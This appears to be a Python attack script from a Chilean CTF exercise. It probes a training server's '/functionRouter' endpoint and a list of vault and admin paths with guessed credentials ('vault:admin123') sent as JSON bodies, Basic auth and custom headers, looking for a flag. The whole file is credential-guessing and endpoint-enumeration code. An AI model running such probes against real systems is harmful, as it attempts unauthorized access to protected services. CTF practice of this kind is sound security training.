#!/usr/bin/env python3
"""
CTF Chile - ASALTO FINAL
Acceso directo usando HTTP al endpoint comprometido
"""
import requests
import json
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"

print("⚔️ ASALTO FINAL - ACCESO DIRECTO")
print("=" * 50)

# Ya que el endpoint responde con omnivault-core-api, intentemos HTTP directo
print("[1/3] Probando acceso HTTP directo al endpoint...")

# Intentar GET directo
try:
    r = requests.get(TARGET + "/functionRouter", timeout=10)
    print(f"GET /functionRouter: {r.status_code}")
    print(f"Respuesta: {r.text[:200]}...")
except Exception as e:
    print(f"Error GET: {e}")

# Intentar sin headers SpEL
try:
    r = requests.post(TARGET + "/functionRouter",
                     headers={"Content-Type": "application/json"},
                     json={"username": "vault", "password": "admin123"},
                     timeout=10)
    print(f"POST JSON: {r.status_code}")
    print(f"Respuesta: {r.text[:200]}...")
except Exception as e:
    print(f"Error POST JSON: {e}")

print("\n[2/3] Intentando endpoints específicos de OmniVault...")

# Endpoints potenciales basados en lo que sabemos
endpoints = [
    "/api/login",
    "/api/vault",
    "/api/admin",
    "/api/secrets",
    "/vault/unlock",
    "/admin/config",
    "/functionRouter/vault",
    "/functionRouter/admin",
    "/omnivault/api",
    "/core/vault"
]

auth_header = base64.b64encode(b"vault:admin123").decode()

for endpoint in endpoints:
    try:
        # POST con credenciales
        r = requests.post(TARGET + endpoint,
                         headers={"Authorization": f"Basic {auth_header}",
                                 "Content-Type": "application/json"},
                         json={"action": "list", "key": "admin123"},
                         timeout=5)

        if r.status_code != 404:
            print(f"✅ {endpoint}: {r.status_code}")
            if r.text and len(r.text) > 10:
                print(f"   Respuesta: {r.text[:300]}...")
                if "flag" in r.text.lower() or "ctf" in r.text.lower():
                    print(f"   🏆 CONTIENE FLAG: {r.text}")

    except Exception as e:
        print(f"❌ {endpoint}: {e}")

print("\n[3/3] Exploración de parámetros específicos...")

# Parámetros que podrían funcionar con vault:admin123
payloads = [
    {"username": "vault", "password": "admin123", "action": "list"},
    {"username": "vault", "password": "admin123", "action": "get", "key": "flag"},
    {"user": "vault", "pass": "admin123", "cmd": "status"},
    {"vault_user": "vault", "vault_pass": "admin123", "operation": "read"},
    {"auth": "vault:admin123", "command": "show_flags"},
    {"token": "admin123", "user": "vault", "request": "secrets"}
]

for payload in payloads:
    try:
        r = requests.post(TARGET + "/functionRouter",
                         headers={"Content-Type": "application/json",
                                 "X-Vault-User": "vault",
                                 "X-Vault-Token": "admin123"},
                         json=payload,
                         timeout=10)

        print(f"Payload {payload}: {r.status_code}")
        if r.text and "Internal Server Error" not in r.text:
            response_text = r.text[:500]
            print(f"   Respuesta: {response_text}...")

            if "flag" in response_text.lower() or "ctf{" in response_text.lower():
                print(f"   🏆 FLAG ENCONTRADA: {response_text}")

    except Exception as e:
        print(f"   Error: {e}")

print("\n" + "="*60)
print("⚔️ ASALTO FINAL COMPLETADO")
print("="*60)
print("💭 Si no aparecieron flags, la API interna requiere:")
print("   • Métodos específicos de OmniVault")
print("   • Tokens de sesión válidos")
print("   • Exploración de otros endpoints")
print("="*60)